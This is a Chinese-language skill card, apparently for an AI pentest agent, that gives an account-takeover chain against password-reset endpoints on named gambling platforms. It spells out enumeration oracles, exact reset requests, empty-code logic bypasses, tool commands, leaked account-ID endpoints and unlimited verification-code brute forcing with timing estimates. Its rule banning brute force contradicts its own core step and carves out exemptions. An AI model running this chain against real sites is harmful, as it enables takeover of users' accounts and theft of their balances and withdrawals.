---
name: 秦百胜·夺舍
description: "使用当目标有forgot/verify密码重置端点时：枚举oracle+字段逆推+验证码识别(🔴禁止爆破), 逻辑绕过→账号接管。"
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, ato, password-reset, enumeration, gambling, laravel]
    category: daaixianzun
---

> **秦百胜**
> 历经五十四次劫，劫云仍旧漫遮天。
> 胸中魂光压众生，拳里剑气纵北原。
> 时来时去四百载，无死何能生新颜？
> 弃此残躯换清风，卷席苍穹复光年！

> ⚠️ 🔴 红线(原作者硬性要求): 禁止密码爆破——字典/批量尝试/凭据喷洒/签名密钥MD5穷举全部禁止。登录类仅走逻辑洞: 默认凭据单次验证、密码重置、JWT篡改、越权、验证码OCR识别。
>
> **大爱仙尊适配**：此条仅在本卡独立工作流内生效。大爱仙尊短字典弱口探针不受此限。

# 密码重置验证码爆破 → 账号接管 (ATO) 通用链

## 触发条件
- 目标为 Laravel/博彩/白标平台，API 存在 `/api/v1/user/forgot/send/mail`、`/forgot/verify` 类密码重置端点
- 首次发现自 AKS 家族 (gofun8/n1s168)，经验证可推广到同源码多租户平台

## 0. 先打逻辑洞（通宝族，禁止先爆破验证码）

```bash
python3 炼蛊房/ato_reset_withdraw_probe.py oracle \
  --base https://授权站 --case <案卷> --exist-user SELF --ghost-user nosuchuser999
python3 炼蛊房/ato_reset_withdraw_probe.py dummy-reset \
  --base https://授权站 --case <案卷> --token "$T" --self-user SELF --new-password 'SelfOnly1!'
python3 炼蛊房/ato_reset_withdraw_probe.py withdraw-pwd \
  --base https://授权站 --case <案卷> --token "$T" --new-password 'WdSelf1!'
```

`resetPassword` 的 `code` 可空/任意、`updateWithdrawPassword` 不要旧密 → L2 后填对象矩阵。  
真提现先问。手法：`传承/夺舍·重置.md`。  
下面 §1–5 只在「code 真校验且无限重试」时才走。

## 攻击链（五步）

### 1. 邮箱/手机号枚举 Oracle
```
POST /api/v1/user/forgot/send/mail {email}
POST /api/v1/user/forgot/send/mobile {mobile, country}
```
- **已绑定** → `{id, account, status:true}` — 泄露重置会话 id + 登录账号名
- **未绑定** → `"This mailbox/phone has not been bound yet"`
- 用 `{id, account}` 即可在 verify 阶段定位账号，无需知道密码

### 2. 触发重置（无需登录）
对已绑定邮箱调 `send/mail` 即返回 `{id, account}`，重置会话建立。

### 3. 重置字段逆推（前端 JS chunk 挖）
- **不要猜字段名** — 从前端组件找（如 ForgetPassword 组件 `__name:"ForgetPassword"`，字段 valid 规则含 `formatConfirmPassword`）
- 关键字段: `password` + **`password2`**（不是 `password_c`！用 password_c 恒报 "Password and confirm password are not the same" = 字段名错误信号）
- 完整 payload:
```
POST /api/v1/user/forgot/verify {
 id, account,
 password, password2, # 新密码 (小写+数字 8-20, 或看前端规则)
 code, # 邮箱/短信验证码
 country, mobile, email
}
```

### 4. 验证码无限爆破（核心漏洞）
- **先测锁定**: 连发 20-60 次错误 code，观察响应:
 - 仅 "Verification code input error"（无 lock/limit/429）→ **可爆破**
 - 出现 "too many/limited/lock" → 不可爆破，换路
- 实测 AKS 家族: 200 次连错**零锁定、零限速、零 IP 封禁**，`~0.67s/次`，5 位码 ~18h / 6 位码 ~7.7 天，可多会话并行
- 验证码位数: 前端 `sendCode`/`getCode` 倒计时组件常暴露；错误消息不区分位数时用常见码格式试探

### 5. 重置 → 登录接管
命中验证码 → 密码重置为新密码 → `POST /login {account, password}` → 完整接管目标账号（余额/提现/钱包）

## 目标账号/邮箱来源
- **rank 类无鉴权接口泄露**: `POST /api/v1/web/rank/withdrawal` 返回的 `account` 数字 ID **可直接作登录账号**（验证: login 报 "Wrong account or password" = 账号存在）
- 但 ATO 要求账号**已绑定邮箱/手机**（TG 注册用户 email=null 不可走此链）→ 需海量枚举手机号段或真实泄露源
- 管理员/运营邮箱若绑定前台账号 = 高价值目标

## 验证清单
1. send/mail 对已绑定 vs 未绑定响应是否区分（oracle 成立）
2. verify 的密码字段名（password2 vs password_c 鉴别法）
3. 连错 60+ 次是否锁定（爆破可行性）
4. 命中后 login 是否用新密码成功

## 规避
- 已确认 AKS 生产/开发同代码（dev-api 可先完整验证链，再上生产）
- 爆破属最后手段 — 先枚举出真实目标再打，不空扫

## 真源

- 手法：`传承/黑楼兰·硬撼.md`
- 工具：`python3 炼蛊房/auth_brute_probe.py --help`
